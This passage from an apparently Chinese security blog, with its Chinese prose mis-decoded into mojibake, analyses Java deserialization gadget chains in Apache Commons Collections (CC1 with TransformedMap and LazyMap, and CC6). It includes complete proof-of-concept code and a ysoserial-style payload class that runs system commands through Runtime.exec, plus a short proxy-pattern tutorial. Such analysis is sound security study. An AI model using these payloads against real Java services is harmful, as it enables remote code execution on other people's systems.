æ­¤è·åä¸å°\n3. ç¶åå¤æ­è·åå°çmembertypeæ¯ä¸æ¯ç©ºç --- æ¯ç©ºç äºæ¯æ§è¡ä¸å°setvlaue\n\n\n1\n2\n3\n\n\näºæ¯æä»¬éè¦å°æåçhashmapä¸­çaaaä¿®æ¹ä¸ºä¸ä¸ªæ³¨è§£ä¸­å­å¨çå¼ï¼ç±äºoverideä¸å­å¨ä»»ä½çå±æ§ï¼å æ­¤æä»¬ä¿®æ¹ä½¿ç¨targetæ³¨è§£ã\n\nâ¦â¦\nmap.put("value","bbb");\nâ¦â¦\nobject o = declaredconstructor.newinstance(target.class, decoratedmap);\n\n\n1\n2\n3\n4\n\n\nè¿æ ·çè¯ï¼ifå¤æ­å°±å¯ä»¥éè¿äºã\n\nç°å¨æ¥è§£å³ç¬¬äºä¸ªé®é¢ï¼æä»¬æ æ³æ§å¶setvalueçåæ°ãsetvalueçåæ°æ¯runtime.classç±»å¯¹è±¡ï¼æç»éè¦ä¼ éç»transformæ¹æ³ãæä»¬æ æ³æ§å¶çè¯ï¼å°±æ æ³æ§è¡å½ä»¤ãè§£å³æ¹æ³å¦ä¸ï¼\n\ntransformeræ¥å£æå¦ä¸ä¸ªå®ç°ç±»ï¼org.apache.commons.collections.functors.constanttransformer\n\nè¯¥ç±»å¨åå»ºæ¶éè¦ä¼ éè¿å»ä¸ä¸ªobjectç±»åçåæ°ï¼å¨æ§è¡å®è¯¥ç±»çtransformæ¹æ³ä¹åï¼ä¼å°æä»¬ä¼ éè¿å»çåæ°è¿åãå¦æå°å¶ç½®äºchainedtransformeræåé¢ï¼åç»­çtransfromæ¹æ³çåæ°é½å°æ¯æä»¬è®¾ç½®çobjectç±»åçåæ°ã\n\ntransformer[] transformers = new transformer[]{\n    new constanttransformer(runtime.class),\n    new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n    new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n    new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"})\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£å³äºä¸é¢ä¸¤ä¸ªé®é¢ï¼å¨å¯¹æç»çå¯¹è±¡è¿è¡ååºååæ¶ï¼å°±ä¼è°ç¨è¯¥å¯¹è±¡çreadobjectæ¹æ³ï¼ç¶åè°ç¨åç»­çä¸ç³»åæ¹æ³ï¼æç»æ§è¡ç³»ç»å½ä»¤ãå®æ´çpocå¦ä¸ï¼\n\npublic class cc1 {\n    public static void main(string[] args) throws exception {\n        transformer[] transformers = new transformer[]{\n            new constanttransformer(runtime.class),\n            new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n            new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n            new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"})\n        };\n\n        chainedtransformer chainedtransformer = new chainedtransformer(transformers);\n        hashmap<object, object> map = new hashmap<>();\n        map.put("value","bbb");\n        map<object,object> decoratedmap = transformedmap.decorate(map, null, chainedtransformer);\n        for (map.entry entry : decoratedmap.entryset()){\n            entry.setvalue(runtime.class);\n        }\n\n        class<?> clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\n        constructor<?> declaredconstructor = clazz.getdeclaredconstructor(class.class, map.class);\n        declaredconstructor.setaccessible(true);\n        object o = declaredconstructor.newinstance(target.class, decoratedmap);\n\n        deserialize(o,"test.ser");\n        object serialize = serialize("test.ser");\n        system.out.println(serialize);\n\n    }\n\n    private static void deserialize(object o,string filename) throws exception{\n        objectoutputstream objectoutputstream = new objectoutputstream(new fileoutputstream(filename));\n        objectoutputstream.writeobject(o);\n    }\n\n    private static object serialize(string filename) throws exception{\n        objectinputstream ois = new objectinputstream(new fileinputstream(filename));\n        return ois.readobject();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\næä»¬åæ¥æ¢³çä¸ä¸è°ç¨é¾ï¼\n\n- ç³»ç»å­å¨ä¸ä¸ªååºååç¹\n\t- ä¼ éæä»¬æé çå¯¹è±¡ï¼ è°ç¨å¯¹è±¡çreadobjectæ¹æ³è¿è¡ååºåå\n\t\t- readobjectä¸­è°ç¨äºsetvalueæ¹æ³\n\t\t\t- setvalueæ¹æ³ä¸­è°ç¨äºchecksetvalueæ¹æ³\n\t\t\t\t- checksetvalueæ¹æ³ä¸­è°ç¨transform\n\t\t\t\t\t- transformæ¹æ³ä¸­å©ç¨åå°æ§è¡ç³»ç»å½ä»¤\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åºäºtransformedmapçcc1\n\nå¨ysoserialä¸­ä½¿ç¨çæ¶lazymapï¼æ¬è´¨ä¸åæä»¬è¿ä¸ªç±»ä¼¼ãå¹¶ä¸å¨ysoserialä¸­å¤§éçä½¿ç¨å°äºå°è£ã\n\nfinal map lazymap = lazymap.decorate(innermap, transformerchain);\n\n\n1\n\n\næä»¬å¯ä»¥å°æä»¬è¿ä¸ªé¾ä¹ç¨ysoserialçæ¹å¼å®ç°ä¸éã\n\npackage ysoserial.payloads;\n\nimport org.apache.commons.collections.transformer;\nimport org.apache.commons.collections.functors.chainedtransformer;\nimport org.apache.commons.collections.functors.constanttransformer;\nimport org.apache.commons.collections.functors.invokertransformer;\nimport org.apache.commons.collections.map.lazymap;\nimport org.apache.commons.collections.map.transformedmap;\nimport ysoserial.payloads.annotation.authors;\nimport ysoserial.payloads.annotation.dependencies;\nimport ysoserial.payloads.annotation.payloadtest;\nimport ysoserial.payloads.util.gadgets;\nimport ysoserial.payloads.util.javaversion;\nimport ysoserial.payloads.util.payloadrunner;\n\nimport java.lang.annotation.target;\nimport java.lang.reflect.constructor;\nimport java.lang.reflect.invocationhandler;\nimport java.util.hashmap;\nimport java.util.map;\n\n@suppresswarnings({"rawtypes", "unchecked"})\n@payloadtest( precondition = "isapplicablejavaversion")\n@dependencies({"commons-collections:commons-collections:3.1"})\n@authors({ authors.frohoff })\npublic class cc1 extends payloadrunner implements objectpayload<invocationhandler> {\n\n\n  @override\n  public invocationhandler getobject(final string command) throws exception {\n\n\n    final transformer[] transformers = new transformer[]{\n      new constanttransformer(runtime.class),\n      new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n      new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n      new invokertransformer("exec", new class[]{string.class}, new object[]{command})\n    };\n    final map innermap = new hashmap();\n    innermap.put("value","123");\n\n    final transformer transformerchain = new chainedtransformer(transformers);\n\n    final map transformedmap = transformedmap.decorate(innermap, null ,transformerchain);\n\n    class<?> clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\n    constructor<?> declaredconstructor = clazz.getdeclaredconstructor(class.class, map.class);\n    declaredconstructor.setaccessible(true);\n    final invocationhandler handler = (invocationhandler) declaredconstructor.newinstance(target.class, transformedmap);\n\n    return handler;\n  }\n\n\n\n  public static void main(final string[] args) throws exception {\n    payloadrunner.run(commonscollections1.class, args);\n  }\n\n  public static boolean isapplicablejavaversion() {\n    return javaversion.isanninvhuniversalmethodimpl();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\nç¶åæä»¬å°±å¯ä»¥ä½¿ç¨ysoserialåå»ºåºååæä»¶äºã\n\n\n# javaä»£ç\n\nä»£çè®¾è®¡æ¨¡å¼æ¯javaä¸­éå¸¸å¸¸ç¨çè®¾è®¡æ¨¡å¼ä¹ä¸ãæè°ä»£çè®¾è®¡æ¨¡å¼ï¼å°±æ¯å®¢æ·ç«¯å¹¶ä¸ç´æ¥è°ç¨å®éçæ¹æ³ï¼èæ¯çæè¯¥ç±»çä»£çå¯¹è±¡ï¼è°ç¨ä»£çå¯¹è±¡çæå®æ¹æ³ï¼ç¶ååç±ä»£çå¯¹è±¡å»è°ç¨å®éçå¯¹è±¡ãç±»ä¼¼äºä¸­é´åã\n\n\n\nä»£çè®¾è®¡æ¨¡å¼æä¸¤ç§å®ç°æ¹å¼ï¼\n\n * éæä»£ç\n * å¨æä»£ç\n\n\n# éæä»£ç\n\néæä»£ççå®ç°åçæ¯ï¼åå»ºä¸ä¸ªæ¥å£ç±»ï¼è®©å®éçç±»åä»£çç±»åå«å»å®ç°è¿ä¸ªæ¥å£ãç¶ååå»ºä»£çç±»çå¯¹è±¡ï¼è°ç¨ä»£çç±»ä¸­å®ç°çæ¹æ³ï¼å¨ä»£çç±»æ¹æ³ä¸­åè°ç¨å®éçæ¹æ³ãä»£ç æ¼ç¤ºå¦ä¸ï¼\n\n// æ¥å£\npackage com.pwddd.proxy;\n\npublic interface iuser {\n  void show();\n\n  void eat();\n\n  void run();\n}\n\n\n// å·ä½å®ç°\npackage com.pwddd.proxy;\n\npublic class userimpl implements iuser{\n  @override\n  public void show() {\n    system.out.println("userimpl .... show");\n  }\n\n  @override\n  public void eat() {\n    system.out.println("userimpl .... eat");\n  }\n\n  @override\n  public void run() {\n    system.out.println("userimpl .... run");\n  }\n}\n\n// ä»£çå®ç°\npackage com.pwddd.proxy;\n\npublic class userproxy implements iuser{\n\n  private userimpl user;\n\n  public userproxy() {\n  }\n\n  public userproxy(userimpl user) {\n    this.user = user;\n  }\n\n  @override\n  public void show() {\n    system.out.println("proxy show");\n    user.show();\n  }\n\n  @override\n  public void eat() {\n    system.out.println("proxy show");\n    user.eat();\n  }\n\n  @override\n  public void run() {\n    system.out.println("proxy show");\n    user.run();\n  }\n}\n\n\n// æµè¯æ¹æ³\npackage com.pwddd.proxy;\n\npublic class proxytest {\n  public static void main(string[] args) {\n    userproxy userproxy = new userproxy(new userimpl());\n    userproxy.show();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\néè¿éæä»£ççæ¹å¼ï¼å½æä»¬æ³è¦è°ç¨showæ¹æ³æ¶ï¼å®éä¸è°ç¨çæ¯ä»£çç±»çshowæ¹æ³ï¼å¨ä»£çç±»ä¸­åç¸åºçå¤çæä½åï¼å¨è°ç¨å®éçæ¹æ³ãè¿ç§éæä»£ççå¼ç«¯å°±æ¯å½éè¦ä»£ççç±»çæ¹æ³ä¿®æ¹æ¶ï¼å¯¹åºçå·ä½å®ç°åä»£çç±»åéè¦è¢«ä¿®æ¹æè½æ­£å¸¸ä½¿ç¨ã\n\nä¸é¢ä»ç»ä¸ç§å¨æ¡æ¶ä¸­å¤§éä½¿ç¨çå¨æä»£çã\n\n\n# å¨æä»£ç\n\néæä»£ççç±»å¨ç¨åºè¿è¡ä¹åå°±è¿è¡äºç¼è¯ãèå¨æä»£çå¹¶ä¸æ¯å¨javaä»£ç ä¸­å®ä¹çï¼èæ¯å¨è¿è¡æ¶åå»ºä»£çç±»çå¯¹è±¡ãç¸æ¯äºéæä»£çï¼ å¨æä»£ççä¼å¿å¨äºå¯ä»¥å¾æ¹ä¾¿çå¯¹ä»£çç±»çå½æ°è¿è¡ç»ä¸çå¤çï¼èä¸ç¨ä¿®æ¹æ¯ä¸ªä»£çç±»ä¸­çæ¹æ³ã\n\nå¨javaçjava.lang.reflectåä¸æä¾äºä¸ä¸ªproxyç±»åä¸ä¸ªinvocationhandleræ¥å£ï¼éè¿è¿ä¸ªç±»åè¿ä¸ªæ¥å£å¯ä»¥çæjdkå¨æä»£çç±»åå¨æä»£çå¯¹è±¡ã\n\nåå»ºä¸ä¸ªæ§è¡å¤çå¨ç±»å®ç°invocationhandleræ¥å£ã\n\npackage com.pwddd.proxy.dynamic;\n\nimport java.lang.reflect.invocationhandler;\nimport java.lang.reflect.method;\n\npublic class myinvocationhandler<t> implements invocationhandler {\n\n  t target;\n\n  public myinvocationhandler() {\n  }\n\n  public myinvocationhandler(t target) {\n    this.target = target;\n  }\n\n  @override\n  public object invoke(object proxy, method method, object[] args) throws throwable {\n    system.out.println(method.getname()+"------------------");\n    object object = method.invoke(target, args);\n\n    return object;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nåå»ºæµè¯å¨æä»£ç\n\npackage com.pwddd.proxy.dynamic;\n\nimport com.pwddd.proxy.staticproxy.iuser;\nimport com.pwddd.proxy.staticproxy.userimpl;\n\nimport java.lang.reflect.invocationhandler;\nimport java.lang.reflect.proxy;\n\npublic class testdynamicproxy {\n  public static void main(string[] args) {\n    iuser user = new userimpl();\n    invocationhandler handler = new myinvocationhandler<>(user);\n\n    iuser userproxy = (iuser) proxy.newproxyinstance(\n      user.getclass().getclassloader(),\n      user.getclass().getinterfaces(),\n      handler);\n    userproxy.eat();\n\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\næä»¬é¦ååå»ºäºä¸ä¸ªinvocationhandlerç±»ï¼å¹¶ä¸å¨è¯¥ç±»çæé æ¹æ³ä¸­ä¼ éè¿å»æä»¬è¦ä»£ççå·ä½ç±»çå¯¹è±¡ãéåinvokeæ¹æ³ï¼å¨è¯¥æ¹æ³ä¸­æ·»å ä»£ççæ¹æ³ï¼å¹¶å©ç¨åå°è°ç¨å®éç±»çæ¹æ³ãä½¿ç¨proxy.newproxyinstanceåå»ºä»£çç±»çå¯¹è±¡ï¼ä½¿ç¨ä»£çç±»å¯¹è±¡è°ç¨æ¹æ³ã\n\n\n# ysoserialçcc1\n\n\n# lazymap\n\næä»¬å¨ä¸é¢è¯´å°ï¼ysoserialçcc1ä½¿ç¨çæ¯lazymapï¼èæä»¬æå»ºçé¾ä½¿ç¨çæ¯transformedmapï¼è¿ä¸¤èå¨åªäºå°æ¹æåºå«å¢ï¼æä»¬æ¥ä¸æ¥å°±æ¥çä¸ä¸ã\n\næä»¬å¯ä»¥çå°ï¼lazymapå¨getæ¹æ³ä¸­è°ç¨äºtransformæ¹æ³ï¼å æ­¤æä»¬å¯ä»¥å°è¯æé ä»¥ä¸ä»£ç ï¼æµè¯æ¯å¦è½å¤æ§è¡ç³»ç»å½ä»¤ã\n\ntransformer[] transformers = new transformer[]{\n    new constanttransformer(runtime.class),\n    new invokertransformer("getmethod", \n                           new class[]{string.class,class[].class}, \n                           new object[]{"getruntime",new class[0]}),\n    new invokertransformer("invoke", \n                           new class[]{object.class,object[].class}, \n                           new object[]{null, new object[0]}),\n    new invokertransformer("exec", \n                           new class[]{string.class},\n                           new string[]{"calc"}),\n};\n\nchainedtransformer chainedtransformer = new chainedtransformer(transformers);\nhashmap<object, object> innermap = new hashmap<>();\ninnermap.put("value", "test");\nmap outermap = lazymap.decorate(innermap, chainedtransformer);\noutermap.get(runtime.getruntime());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nç»è¿æµè¯ï¼åç°æ¯å¯ä»¥è¿è¡å½ä»¤æ§è¡çï¼é£ä¹å°±éè¦ç»§ç»­å¾ä¸å¯»æ¾ï¼åªéè°ç¨è¿setæ¹æ³ãæç»å¨annotationinvokerhandlerä¸­çinvokeæ¹æ³ä¸­æ¾å°äºè°ç¨ï¼\n\npublic object invoke(object proxy, method method, object[] args) {\n    string member = method.getname();\n    class<?>[] paramtypes = method.getparametertypes();\n\n    // handle object and annotation methods\n    if (member.equals("equals") && paramtypes.length == 1 &&\n        paramtypes[0] == object.class)\n        return equalsimpl(args[0]);\n    if (paramtypes.length != 0)\n        throw new assertionerror("too many parameters for an annotation method");\n\n    switch(member) {\n        case "tostring":\n            return tostringimpl();\n        case "hashcode":\n            return hashcodeimpl();\n        case "annotationtype":\n            return type;\n    }\n\n    // handle annotation member accessors\n    object result = membervalues.get(member);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nä½æ¯éæ¾çæ¯ï¼å¨annotationinvokerhandlerçreadobjectæ¹æ³ä¸­å¹¶æ²¡æè°ç¨è¿invokeæ¹æ³ãé£ä¹ysoserialæä¾çæ¹æ³æ¯ä½¿ç¨å¨æä»£çï¼è¿æ ·çè¯å¦æè°ç¨äºreadobjectæ¹æ³ï¼å¹¶ä¸å¨readobjectæ¹æ³ä¸­è°ç¨äºå¯¹è±¡çä»»ææ¹æ³ï¼å°±ä¼è§¦åä»£çç±»çinvokeæ¹æ³ï¼å¯¼è´å½ä»¤æ§è¡ã\n\nå®æ´çlazymap cc1é¾å¦ä¸ï¼\n\ntransformer[] transformers = new transformer[]{\n  new constanttransformer(runtime.class),\n  new invokertransformer(\n    "getmethod",\n    new class[]{string.class,class[].class},\n    new object[]{"getruntime",new class[0]}\n  ),\n\n  new invokertransformer(\n    "invoke",\n    new class[]{object.class,object[].class},\n    new object[]{null,new object[0]}\n  ),\n\n  new invokertransformer(\n    "exec",\n    new class[]{string.class},\n    new object[]{"/system/applications/calculator.app/contents/macos/calculator"}\n  )\n};\n\nchainedtransformer chainedtransformer = new chainedtransformer(transformers);\nhashmap innermap = new hashmap();\ninnermap.put("value","xxx");\nmap outermap = lazymap.decorate(innermap,chainedtransformer);\n\nclass clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\nconstructor constructor = clazz.getdeclaredconstructor(class.class, map.class);\nconstructor.setaccessible(true);\ninvocationhandler instance = (invocationhandler) constructor.newinstance(retention.class, outermap);\n\nmap proxymap = (map) proxy.newproxyinstance(map.class.getclassloader(), new class[]{map.class}, instance);\ninstance = (invocationhandler) constructor.newinstance(retention.class, proxymap);\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# ä¸¤ä¸ªå°ç»è\n\nå¨è¿è¡ä¸è¿°pocçæ¶åï¼å¯è½ä¼åºç°åæ¶æå¼å¤ä¸ªè®¡ç®å¨ãè¿ç§é®é¢çåå æ¯æä»¬çæäºä»£çç±»çå¯¹è±¡ï¼é£ä¹å½æ¯æ¬¡è¢«ä»£çç±»çæ¹æ³è¢«è°ç¨æ¶ï¼é½ä¼æ§è¡ä»£çç±»çinvokeæ¹æ³ï¼ä»èå¯¼è´å¼¹åºè®¡ç®å¨ãysoserialä¸ºäºé¿åè¿ä¸ªé®é¢ï¼ç¹æå°transformersæ°ç»æåææ¾ç½®å°transformerchainsä¸­ã\n\n\n\nå¦å¤ä¸ä¸ªå°±æ¯ysoserialçtransformeræ°ç»å¨æç»æ·»å äºä¸ä¸ªconstanttransformer(1)ãæ ¹æ®pç¥å¨javaå®å¨æ¼«è°ä¸­çè§£éï¼æ¯ä¸ºäºéèå¼å¸¸æ¥å¿ä¸­çä¸äºä¿¡æ¯ãæä»¬è¿éä¸åæ·±ç©¶ã\n\n\n# åèèµæ\n\nä»£ç å®¡è®¡ç¥è¯æç - javaå®å¨æ¼«è°ï¼https://wx.zsxq.com/dweb2/index/group/2212251881\n\nç½æ¥æ¢¦ç»é¿ bilibili ï¼ https://space.bilibili.com/2142877265',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"CC6åæ",frontmatter:{title:"CC6åæ",date:"2022-03-20T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc6",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","CC","ysoserial"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/03.CC6%E5%88%86%E6%9E%90.html",relativePath:"02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/03.CC6åæ.md",key:"v-0c9de936",path:"/sec/vuln/deserialization/cc6/",headers:[{level:2,title:"èæ¯",slug:"èæ¯",normalizedTitle:"èæ¯",charIndex:16},{level:2,title:"å©ç¨é¾åæ",slug:"å©ç¨é¾åæ",normalizedTitle:"å©ç¨é¾åæ",charIndex:6}],headersStr:"èæ¯ å©ç¨é¾åæ",content:'# CC6 å©ç¨é¾åæ\n\n\n# èæ¯\n\næä»¬å¨åæCC1æ¶ä½¿ç¨çjdkçæ¬æ¶8u65ï¼å¦æä½¿ç¨é«äº8u71çæ¬çjdkåæ æ³å©ç¨CC1é¾ãè¿æ¯å ä¸ºå¨é«çæ¬çjdkä¸­æ¹è¿äºAnnotationInvocationHandlerçreadObjectæ¹æ³çå©ç¨é»è¾ãå¨ysoserialä¸­ï¼CC6è§£å³äºé«çæ¬jdkæ æ³ä½¿ç¨çé®é¢ï¼æ¯ysoserialæ¯è¾éç¨åå¨è½çä¸æ¡é¾ãä½æ¯è¿æ¡å©ç¨é¾è¿æ¯éè¦ä¾é CommonsCollections3.2.2ä»¥ä¸ççæ¬ã\n\n\n# å©ç¨é¾åæ\n\næä»¬å¨CC1ä¸­åæè¿ï¼ysoserialä¸­ä½¿ç¨çLazyMapåæä»¬ä½¿ç¨çTransformedMapæä¸ç¹åºå«ï¼lazyMapä½¿ç¨çæ¯AnnotationInvokerHandlerçinvokeæ¹æ³è°ç¨å¶setæ¹æ³ãèè¦æ§è¡invokeæ¹æ³éè¦åè£ä¸ä¸ªå¨æä»£çå¯¹è±¡ãèæ¬æ¬¡çCC6é¾åæ ·æ¯è°ç¨lazyMapå®ç°çï¼åé¢çé½æ¯ä¸è´çï¼åªæ¯å¥å£å°setæ¹æ³ä½ç½®ä¸ä¸è´ãä¸é¢æ¯CC6çè°ç¨é¾ã\n\n\tGadget chain:\n\t    java.io.ObjectInputStream.readObject()\n            java.util.HashSet.readObject()\n                java.util.HashMap.put()\n                java.util.HashMap.hash()\n                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()\n                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()\n                        org.apache.commons.collections.map.LazyMap.get()\n                            org.apache.commons.collections.functors.ChainedTransformer.transform()\n                            org.apache.commons.collections.functors.InvokerTransformer.transform()\n                            java.lang.reflect.Method.invoke()\n                                java.lang.Runtime.exec()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä»LazyMapçgetå¼å§ï¼åä¸å¯»æ¾åªéè°ç¨äºgetæ¹æ³ï¼å¹¶ä¸æä»¬åæ°å¯æ§ãæ ¹æ®è¿æ¡gadget chainï¼æä»¬æ¾å°äºTiedMapEntry.getValueæ¹æ³ãå¨getValueä¸­è°ç¨äºmapçgetæ¹æ³ãèmapæ¯å¯ä»¥éè¿æåæé ä¼ å¥çã\n\n\n\næä»¬å°è¯æé ä¸ä¸ï¼\n\npackage com.pwddd.cc6;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.util.Calendar;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) {\n\n        // 1. chains\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\n                        "getMethod",\n                        new Class[]{String.class,Class[].class},\n                        new Object[]{"getRuntime",null}\n                ),\n                new InvokerTransformer(\n                        "invoke",\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, null}\n                ),\n                new InvokerTransformer(\n                        "exec",\n                        new Class[]{String.class},\n                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}\n                )\n        };\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap<Object, Object> map = new HashMap<>();\n        Map lazyMap = LazyMap.decorate(map, chainedTransformer);\n        // lazyMap.get("bbb");\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");\n        tiedMapEntry.getValue();\n        \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\nä¸é¢çä»£ç åºæ¬é½æ¯ç±»ä¼¼çï¼åé¢ä½¿ç¨tiedMapEntityå°è£äºlazyMapï¼å¹¶è°ç¨getValueæ¹æ³ãè½å¤æ§è¡ç¸åºçç»æã\n\n\n\næ¢ç¶å°tiedMapEntityè¿ä¸æ­¥è½å¤æ§è¡ï¼å°±éè¦ç»§ç»­å¯»æ¾åªéè°ç¨äºgetValueæ¹æ³ãå¨tiedMapEntityä¸­çhashCodeæ¹æ³ä¸­è°ç¨äºgetValueæ¹æ³ãhashCodeæ¹æ³æä»¬å·²ç»å¾çæäºï¼å¨URLDNSä¸­ï¼ä¹æ¯å©ç¨äºHashMapçhashCodeæ¹æ³ã\n\n\n\né£ä¹æåæ¬¡å°è¯è°ç¨ä¸ä¸ï¼\n\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");\n//        tiedMapEntry.getValue();\ntiedMapEntry.hashCode();\n\n\n1\n2\n3\n\n\nåç°æ¯å¯ä»¥çï¼é£ä¹åªéåè°ç¨äºhashCodeæ¹æ³ï¼å¹¶ä¸è°ç¨hashCodeçå¯¹è±¡æä»¬å¯ä»¥æ§å¶å¢ï¼\n\nå¨URLDNSä¸­ï¼æä»¬ç¥éHashMapä¸­çhashæ¹æ³ä¼å¯¹æä»¬ä¼ å¥çkeyåhashï¼ä¼æç¨keyçhashCodeæ¹æ³ãå æ­¤åªéè¦å°tiedMapEntityä½ä¸ºHashMapçkeyå³å¯ã\n\nHashMap<Object, Object> hashMap = new HashMap<>();\nhashMap.put(tiedMapEntry,"bbb");\n\n\n1\n2\n\n\nå¨putæ¶ä¹ä¼å¼¹åºè®¡ç®å¨ï¼è¿æ¯å ä¸ºå¨hashMapçputæ¹æ³ä¸­ä¹ä¼è®¡ç®keyçhashå¼ï¼æä»¬å¯ä»¥åä¸å°æä»¬çchainedTransformerå°è£è¿å»ï¼è¿æ ·å°±æ æ³è°ç¨äºã\n\nMap lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));\n\nClass<LazyMap> clazz = LazyMap.class;\nField factory = clazz.getDeclaredField("factory");\nfactory.setAccessible(true);\nfactory.set(lazyMap,transformers);\n\n\n1\n2\n3\n4\n5\n6\n\n\næä»¬å°è¯å°çæçå¯¹è±¡åºååä¹åï¼åååºååãä»ç¶æ æ³å¼¹åºè®¡ç®å¨ãæä»¬è·è¸ªä¸ä¸ä»£ç çä¸ä¸ï¼\n\n\n\næä»¬çå°å½æ§è¡å°è¿éçæ¶åï¼mapä¸­å·²ç»ækeyä¸ºaaaçæ°æ®äºï¼é£ä¹å°±ä¸ä¼æ§è¡ä¸é¢çtransformæ¹æ³ãå æ­¤æä»¬éè¦æaaaçkeyç§»é¤ï¼è¿æ ·å¨ååºååçæ¶åï¼mapéé¢æ²¡æå¯¹åºçkeyæå¯ä»¥æ§è¡ã\n\nå®æ´çä»£ç å¦ä¸ï¼\n\npublic static void main(String[] args) throws Exception {\n\n  // 1. chains\n  Transformer[] transformers = new Transformer[]{\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer(\n      "getMethod",\n      new Class[]{String.class,Class[].class},\n      new Object[]{"getRuntime",null}\n    ),\n    new InvokerTransformer(\n      "invoke",\n      new Class[]{Object.class, Object[].class},\n      new Object[]{null, null}\n    ),\n    new InvokerTransformer(\n      "exec",\n      new Class[]{String.class},\n      new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}\n    )\n  };\n\n  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n  HashMap<Object, Object> map = new HashMap<>();\n  Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));\n\n  TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");\n\n  HashMap<Object, Object> hashMap = new HashMap<>();\n  hashMap.put(tiedMapEntry, "bbb");\n  lazyMap.remove("aaa");\n\n  Field factoryField = LazyMap.class.getDeclaredField("factory");\n  factoryField.setAccessible(true);\n  factoryField.set(lazyMap,chainedTransformer);\n\n\n  serialize(hashMap);\n  deserialize();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n',normalizedContent:'# cc6 